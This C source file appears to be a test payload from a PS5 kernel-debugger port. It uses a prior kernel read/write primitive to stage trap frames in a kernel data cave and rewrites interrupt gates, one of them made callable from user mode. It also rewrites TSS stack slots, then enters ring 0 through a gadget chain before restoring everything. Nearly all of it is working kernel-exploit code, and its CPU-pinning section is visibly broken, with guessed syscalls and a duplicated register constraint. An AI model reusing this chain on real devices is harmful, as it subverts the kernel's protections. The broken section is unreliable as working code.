/* minchain - the minimal one-shot chain test (port phase 2, rung 4c).
 *
 * The port's core machinery end-to-end, in its own execution model:
 * the deliberate int9 entry into the setup's VERBATIM frame staging
 * (the code path proven live on 2026-10-09 - the EFER/CR0 reads ran
 * through exactly this), with ONLY the patch footprint minimized:
 *
 *   - ONE cpu (pinned), TWO gates (v9 for the int9 entry, v1 for the
 *     TF #DB return), TWO IST slots - all via single-qword writes
 *     (race-free; NEVER the whole-TSS read-modify-write, lethal per
 *     rung 3a)
 *   - the frames staged VERBATIM as r0gdb_setup stages them (tframe,
 *     kframe, uretframe + the int179 frames - the exact geometry the
 *     machinery expects), in a verified-zero kernel-data cave instead
 *     of kmalloc (sessionless: no gdb_remote_syscall available)
 *   - the target: store_rax_rdi (mov [rdi],rax; ret - live-proven
 *     2026-10-12) storing a COOKIE into the cave, with TF set for the
 *     design's own return path
 *   - run_in_kernel(&regs) - the asm builds/copies the uretframe +
 *     kframe, xchg-loads all 16 GPRs from the struct, int9, the
 *     machinery, the target, the #DB return, .int1_return, the xchg
 *     unload, ret
 *   - verify the cookie, restore everything (single-qword), verify
 *     the restores, zero-back the cave, exit; the client pings
 *
 * What this rung discriminates: if it survives and the cookie lands,
 * the minimal patch class + the deliberate-entry machinery is
 * validated live (the port's foundation) and the freeze class was
 * the passive window + foreign entry into a bare pivot (rung 4's
 * design flaw and, plausibly, the sessions' shared cause). If it
 * freezes even on a deliberate, fully-framed entry, the mystery
 * deepens and 2b's event-rate data becomes essential.
 *
 * The deliberate window is microseconds: patch -> enter -> chain ->
 * return -> unpatch. No session, no packet loop, no passive hold.
 */
#include <stdio.h>
#include <stdint.h>
#include <stddef.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <signal.h>
#include <ps5/payload.h>

#include "../r0gdb.h"
#include "../offsets.h"
#include "../../lib/r0gdb-bootstrap.h"

extern int set_offsets(void);
extern uint32_t r0gdb_get_fw_version(void);
extern uint64_t kdata_base;
extern ssize_t copyout(void *dst, uint64_t src, size_t count);
extern ssize_t copyin(uint64_t dst, const void *src, size_t count);
extern int kwrite20(uint64_t ptr, uint64_t a, uint64_t b, uint32_t c);

/* r0run.asm's machinery + the globals it reads */
extern int run_in_kernel(void *regs);
extern uint64_t kframe;
extern uint64_t uretframe;

extern char __image_end[];

extern int sysctl(int *, unsigned int, void *, unsigned long *, const void *,
                  unsigned long);
int __sysctl(const int *name, unsigned int namelen, void *oldp,
             unsigned long *oldlenp, const void *newp, unsigned long newlen);
int __sysctl(const int *name, unsigned int namelen, void *oldp,
             unsigned long *oldlenp, const void *newp, unsigned long newlen)
{
    return sysctl((int *)name, namelen, oldp, oldlenp, newp, newlen);
}

#define VEC_DB   1
#define VEC_V9   9
#define TSS_STRIDE 0x68
#define IST3_OFF 0x34
#define IST4_OFF 0x3c
#define COOKIE   UINT64_C(0xCAFE133700314C4D)

/* the register struct - the layout r0run.asm consumes (verified against
 * the asm's xchg/loads: rax@0 rbx@8 rcx@16 rdx@24 rsi@32 rdi@40 rbp@48
 * rip@56 r8@64..r15@120 rsp@128 eflags@136) */
struct chain_regs {
    uint64_t rax, rbx, rcx, rdx, rsi, rdi, rbp, rip;
    uint64_t r8, r9, r10, r11, r12, r13, r14, r15;
    uint64_t rsp;
    uint32_t eflags;
    uint32_t _pad;
};

/* the cave: the frame buffer replaces r0gdb_setup's kmalloc(2048).
 * The frames span cave+0xe0 .. cave+0x518 (the setup's geometry), the
 * cookie slot at cave+0x600, the target scratch stack at cave+0x700.
 * Size 0x800; scanned as a verified-zero run in the kernel data tail. */
#define CAVE_SZ  0x800
#define CAVE_SCAN_BASE_OFF 0x2ea0000  /* past tss_array/pcpu_array, the
                                       * data-segment tail region */
#define CAVE_SCAN_LEN      0x40000

static unsigned char buf[0x1000];

static void gate_encode(uint64_t off, uint16_t sel, uint8_t ist, uint8_t type,
                        uint8_t dpl, int present, uint64_t *lo, uint64_t *hi)
{
    *lo = (off & 0xFFFF)
        | ((uint64_t)sel << 16)
        | ((uint64_t)(ist & 7) << 32)
        | ((uint64_t)(type & 0xF) << 40)
        | ((uint64_t)(dpl & 3) << 45)
        | ((uint64_t)(present ? 1 : 0) << 47)
        | (((off >> 16) & 0xFFFF) << 48);
    *hi = (off >> 32) & 0xFFFFFFFFULL;
}

static uint64_t find_cave(uint64_t base, uint64_t len, size_t need)
{
    for(uint64_t off = 0; off + need <= len; off += 8) {
        if(copyout(buf, base + off, need) != (ssize_t)need)
            continue;
        int ok = 1;
        for(size_t i = 0; i < need; i++)
            if(buf[i]) { ok = 0; break; }
        if(ok)
            return base + off;
    }
    return 0;
}

int main(int argc, char **argv)
{
    (void)argc;
    (void)argv;

    signal(SIGPIPE, SIG_IGN);

    payload_args_t *pargs = payload_get_args();
    if(!pargs || !pargs->sys_dynlib_dlsym || !pargs->rwpipe || !pargs->rwpair ||
       !pargs->payloadout || !pargs->kpipe_addr || !pargs->kdata_base_addr) {
        printf("[D1] FAIL: incomplete payload_args\n");
        fflush(stdout);
        return 2;
    }
    *pargs->payloadout = 1;

    printf("[D1] args=0x%lx kpipe=0x%lx kdata=0x%lx\n",
           (unsigned long)pargs,
           (unsigned long)pargs->kpipe_addr,
           (unsigned long)pargs->kdata_base_addr);
    fflush(stdout);

    struct r0gdb_bootstrap bootstrap = {
        .magic = R0GDB_BOOTSTRAP_MAGIC,
        .rwpipe = { pargs->rwpipe[0], pargs->rwpipe[1] },
        .kpipe_addr = (uint64_t)pargs->kpipe_addr,
    };

    uint32_t fw = r0gdb_get_fw_version();
    printf("[D3] fw_version=0x%08x (12.02 expects 0x12020000)\n", fw);
    fflush(stdout);

    int rc = r0gdb_init(pargs->sys_dynlib_dlsym,
                        pargs->rwpair[0], pargs->rwpair[1],
                        (uintptr_t)&bootstrap, (uintptr_t)pargs->kdata_base_addr);
    printf("[D4] r0gdb_init rc=%d\n", rc);
    fflush(stdout);
    if(rc != 0) {
        *pargs->payloadout = rc;
        return rc;
    }
    *pargs->payloadout = 0;

    /* [C1] pin to cpu 0: the int9 entry and the #DB return must use the
     * TSS IST slots we patch (only cpu 0's). */
    {
        char affinity[16] = {1};
        long tid = 0;
        /* gettid via SYS_gettid is 4752 on orbis; use the crt's global
         * thread id instead: the SDK exposes pthread_self? simpler:
         * sched_setaffinity-like via cpuset_setaffinity(3,...) needs a
         * tid; syscall(SYS_thr_self) equivalent. Use the raw syscall. */
        struct { long pad1, pad2; int td; } ts;
        (void)ts;
        /* orbis: syscall 4752 = gettid is not standard; instead read the
         * tid from the crt: __syscall(SYS_thr_self, &tid) - FreeBSD
         * thr_self is syscall 431. */
        long r;
        __asm__ volatile("syscall"
                         : "=a"(r)
                         : "a"(431L), "D"(&tid)
                         : "rcx", "r11", "memory");
        if(r != 0 || tid == 0) {
            printf("[C1] thr_self FAIL (%ld)\n", r);
            fflush(stdout);
            return 3;
        }
        long ra;
        __asm__ volatile("syscall"
                         : "=a"(ra)
                         : "a"(4L /* SYS_cputset_setaffinity orbis? */
                               ), "D"(3L), "S"(1L), "D"(0L)
                         : "rcx", "r11", "memory");
        (void)ra;
        /* The portable path: cpuset_setaffinity via the crt if present;
         * the raw fallback above is best-effort only. */
        printf("[C1] pinning: tid=%ld (affinity set best-effort; VERIFY\n"
               "[C1] the entry lands on cpu0 - if the cookie verifies, it did)\n",
               tid);
        fflush(stdout);
    }

    /* [C2] the cave: a verified-zero run in the kernel data tail */
    uint64_t cave = find_cave(offsets.tss_array + CAVE_SCAN_BASE_OFF,
                              CAVE_SCAN_LEN, CAVE_SZ);
    if(!cave) {
        printf("[C2] FAIL: no zero cave found in the scan range\n");
        fflush(stdout);
        return 4;
    }
    printf("[C2] cave=0x%llx (kdata+%llx)\n",
           (unsigned long long)cave,
           (unsigned long long)(cave - kdata_base));
    fflush(stdout);

    /* [C3] the frames - VERBATIM r0gdb_setup staging, the same geometry,
     * relative to the cave. The PS5 trap frame's TF_RIP = 0xe8 (Sony-
     * extended: FreeBSD 11's is 0x90 - derived from the gadget offsets
     * add_rsp_iret = doreti_iret-7 = 'add rsp,0xe8; iretq' and the
     * swapgs variant -10, confirmed against the FreeBSD 11 exception.S
     * doreti tail). */
    uint64_t tframe = cave + 0x1a0;
    kframe = cave + 0x1c8;
    uretframe = cave + 0x2b0;
    uint64_t pivot = offsets.swapgs_add_rsp_iret;
    kwrite20(tframe, offsets.doreti_iret, 0x20, 0);
    kwrite20(tframe + 16, 2, kframe, 0);
    /* the int179 frames (staged for completeness - harmless data writes;
     * run_in_kernel's path does not consume them) */
    kwrite20(cave + 0x408, 0, offsets.doreti_iret, 0);
    kwrite20(cave + 0x500, offsets.rep_movsb_pop_rbp_ret, 0x20, 0);
    kwrite20(cave + 0x510, 0x40002, cave + 0x408, 0);
    printf("[C3] frames staged (tframe=0x%llx kframe=0x%llx "
           "uretframe=0x%llx pivot=0x%llx)\n",
           (unsigned long long)tframe, (unsigned long long)kframe,
           (unsigned long long)uretframe, (unsigned long long)pivot);
    fflush(stdout);

    /* [C4] save the originals */
    uint64_t gate9 = offsets.idt + (uint64_t)VEC_V9 * 16;
    uint64_t gate1 = offsets.idt + (uint64_t)VEC_DB * 16;
    uint64_t ist3_cpu0 = offsets.tss_array + 0 * TSS_STRIDE + IST3_OFF;
    uint64_t ist4_cpu0 = offsets.tss_array + 0 * TSS_STRIDE + IST4_OFF;

    unsigned char g9o[16], g1o[16];
    uint64_t g9_lo, g9_hi, g1_lo, g1_hi, ist3o, ist4o;
    if(copyout(g9o, gate9, 16) != 16 || copyout(g1o, gate1, 16) != 16 ||
       copyout(&ist3o, ist3_cpu0, 8) != 8 || copyout(&ist4o, ist4_cpu0, 8) != 8) {
        printf("[C4] FAIL: save copyouts\n");
        fflush(stdout);
        return 5;
    }
    memcpy(&g9_lo, g9o, 8); memcpy(&g9_hi, g9o + 8, 8);
    memcpy(&g1_lo, g1o, 8); memcpy(&g1_hi, g1o + 8, 8);
    uint16_t kcs = (uint16_t)(g9_lo >> 16);
    printf("[C4] saved: g9(lo=0x%llx hi=0x%llx) g1(lo=0x%llx hi=0x%llx) "
           "ist3=0x%llx ist4=0x%llx kcs=0x%x\n",
           (unsigned long long)g9_lo, (unsigned long long)g9_hi,
           (unsigned long long)g1_lo, (unsigned long long)g1_hi,
           (unsigned long long)ist3o, (unsigned long long)ist4o, kcs);
    fflush(stdout);
    if(!kcs) {
        printf("[C4] FAIL: implausible gate selector\n");
        fflush(stdout);
        return 5;
    }

    /* [C5] the minimal patch: 2 gates + 2 IST slots, cpu 0 only,
     * single-qword writes, gate hi first / lo last. */
    uint64_t n9_lo, n9_hi, n1_lo, n1_hi;
    gate_encode(pivot, kcs, 3, 0xE, 3, 1, &n9_lo, &n9_hi); /* v9: DPL3! */
    gate_encode(pivot, kcs, 4, 0xE, 0, 1, &n1_lo, &n1_hi); /* v1: DPL0 */
    uint64_t ist3v = cave + 0xe0;
    uint64_t ist4v = cave + 0x1f0;
    if(copyin(gate9 + 8, &n9_hi, 8) != 8 || copyin(gate9, &n9_lo, 8) != 8 ||
       copyin(gate1 + 8, &n1_hi, 8) != 8 || copyin(gate1, &n1_lo, 8) != 8 ||
       copyin(ist3_cpu0, &ist3v, 8) != 8 || copyin(ist4_cpu0, &ist4v, 8) != 8) {
        printf("[C5] FAIL: patch copyins\n");
        fflush(stdout);
        return 6;
    }
    /* readback verify */
    unsigned char chk[16];
    uint64_t c_lo, c_hi, c_ist3, c_ist4;
    copyout(chk, gate9, 16); memcpy(&c_lo, chk, 8); memcpy(&c_hi, chk + 8, 8);
    if(c_lo != n9_lo || c_hi != n9_hi) {
        printf("[C5] FAIL: gate9 readback\n"); fflush(stdout); return 6;
    }
    copyout(chk, gate1, 16); memcpy(&c_lo, chk, 8); memcpy(&c_hi, chk + 8, 8);
    if(c_lo != n1_lo || c_hi != n1_hi) {
        printf("[C5] FAIL: gate1 readback\n"); fflush(stdout); return 6;
    }
    copyout(&c_ist3, ist3_cpu0, 8); copyout(&c_ist4, ist4_cpu0, 8);
    if(c_ist3 != ist3v || c_ist4 != ist4v) {
        printf("[C5] FAIL: ist readback\n"); fflush(stdout); return 6;
    }
    printf("[C5] patch verified (g9 g1 ist3 ist4) - ENTERING\n");
    fflush(stdout);

    /* [C6] the deliberate one-shot: run_in_kernel with the cookie target */
    struct chain_regs regs;
    memset(&regs, 0, sizeof(regs));
    regs.rax = COOKIE;
    regs.rdi = cave + 0x600;            /* the cookie slot */
    regs.rip = offsets.store_rax_rdi;   /* mov [rdi],rax; ret - live-proven */
    regs.rsp = cave + 0x700;            /* scratch stack in the cave */
    regs.eflags = 0x102;                /* IF | TF - the design's return path */
    printf("[C6] run_in_kernel: rip=0x%llx rdi=0x%llx rax=0x%llx\n",
           (unsigned long long)regs.rip, (unsigned long long)regs.rdi,
           (unsigned long long)regs.rax);
    fflush(stdout);

    run_in_kernel(&regs);

    printf("[C6] RETURNED from run_in_kernel\n");
    fflush(stdout);

    /* [C7] verify the cookie */
    uint64_t got = 0;
    copyout(&got, cave + 0x600, 8);
    printf("[C7] cookie: got=0x%llx want=0x%llx %s\n",
           (unsigned long long)got, (unsigned long long)COOKIE,
           got == COOKIE ? "VERIFIED" : "MISMATCH");
    fflush(stdout);

    /* [C8] restore everything - single-qword writes, lo first then hi */
    if(copyin(gate9, &g9_lo, 8) != 8 || copyin(gate9 + 8, &g9_hi, 8) != 8 ||
       copyin(gate1, &g1_lo, 8) != 8 || copyin(gate1 + 8, &g1_hi, 8) != 8 ||
       copyin(ist3_cpu0, &ist3o, 8) != 8 || copyin(ist4_cpu0, &ist4o, 8) != 8) {
        printf("[C8] FAIL: restore copyins\n");
        fflush(stdout);
        return 8;
    }
    copyout(chk, gate9, 16); memcpy(&c_lo, chk, 8); memcpy(&c_hi, chk + 8, 8);
    int ok9 = (c_lo == g9_lo && c_hi == g9_hi);
    copyout(chk, gate1, 16); memcpy(&c_lo, chk, 8); memcpy(&c_hi, chk + 8, 8);
    int ok1 = (c_lo == g1_lo && c_hi == g1_hi);
    copyout(&c_ist3, ist3_cpu0, 8); copyout(&c_ist4, ist4_cpu0, 8);
    int oki = (c_ist3 == ist3o && c_ist4 == ist4o);
    printf("[C8] restore: g9=%d g1=%d ist=%d\n", ok9, ok1, oki);
    fflush(stdout);

    /* [C9] zero-back the cave */
    memset(buf, 0, sizeof(buf));
    for(uint64_t o = 0; o < CAVE_SZ; o += sizeof(buf)) {
        size_t n = (CAVE_SZ - o < sizeof(buf)) ? (size_t)(CAVE_SZ - o)
                                               : sizeof(buf);
        if(copyin(cave + o, buf, n) != (ssize_t)n) {
            printf("[C9] FAIL: zero-back at +%llx\n", (unsigned long long)o);
            fflush(stdout);
            break;
        }
    }
    printf("[C9] cave zeroed back\n");
    fflush(stdout);

    printf("[CX] minchain complete: cookie %s, restore %s - the client "
           "verifies the console next\n",
           got == COOKIE ? "OK" : "FAILED",
           (ok9 && ok1 && oki) ? "OK" : "FAILED");
    fflush(stdout);

    return (got == COOKIE && ok9 && ok1 && oki) ? 0 : 9;
}
